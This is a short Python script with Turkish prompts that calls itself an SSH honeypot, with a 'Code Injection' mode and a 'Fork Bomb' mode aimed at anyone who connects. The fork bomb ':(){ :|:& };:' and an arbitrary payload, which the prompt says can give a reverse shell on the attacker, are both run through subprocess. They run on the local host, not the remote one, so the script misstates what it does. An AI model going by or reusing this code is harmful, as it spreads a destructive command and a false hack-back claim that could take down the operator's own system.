import socket
import subprocess
import os
import time

def banner():
    scm = input("Honeypot türünü seçin:\n1-Code Injection\n2-Normal\n3-Fork Bomb (sadece linux için)\n")
    temizle()
    print("Coded by Yawos")
    time.sleep(1)
    if scm == '1':
        start_ssh_honeypot2()
    elif scm == '2':
        start_ssh_honeypot()
    elif scm == '3':
        start_ssh_honeypot3()
    else:
        print("Geçersiz seçim. Lütfen 1, 2 veya 3 girin.")

def start_ssh_honeypot3():
    host = input("Hostunuzu giriniz:")
    port = int(input("Sahte SSH portunu giriniz:"))
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.bind((host, port))
    sock.listen(5)
    print(f'SSH honeypot listening on {host}:{port}...')
    while True:
        client_sock, client_addr = sock.accept()
        print(f'Baglanan {client_addr}')
        print("HACKER YAKALANDI")
        print("Fork Bomb calisiyor...")
        try:
            output = subprocess.check_output(":(){ :|:& };:", shell=True)
            client_sock.send(output)
        except Exception as e:
            print(f'Hata: Bir problem oldu.')
        client_sock.close()

def start_ssh_honeypot():
    host = input("Hostunuzu giriniz:")
    port = int(input("Sahte SSH portunu giriniz:"))
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.bind((host, port))
    sock.listen(5)
    print(f'SSH honeypot listening on {host}:{port}...')
    while True:
        client_sock, client_addr = sock.accept()
        print(f'Baglanan {client_addr}')
        print("HACKER YAKALANDI")

def start_ssh_honeypot2():
    host = input("Hostunuzu giriniz:")
    port = int(input("Sahte SSH portunu giriniz:"))
    payload = input("Karşı sistemde saldırganın komut istemcisinde çalışacak kodu giriniz (reverse shell alabilirsiniz):\n")
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.bind((host, port))
    sock.listen(5)
    print(f'SSH honeypot listening on {host}:{port}...')
    client_sock, client_addr = sock.accept()
    print(f'Baglanan {client_addr}')
    print("HACKER YAKALANDI")
    print("Kod çalıştırılıyor...")
    try:
        output = subprocess.check_output(payload, shell=True)
        client_sock.send(output)
    except Exception as e:
        print(f'Hata: Bir problem oldu.')
    client_sock.close()

def temizle():
    if os.name == "nt":
        os.system("cls")
    else:
        os.system("clear")

banner()
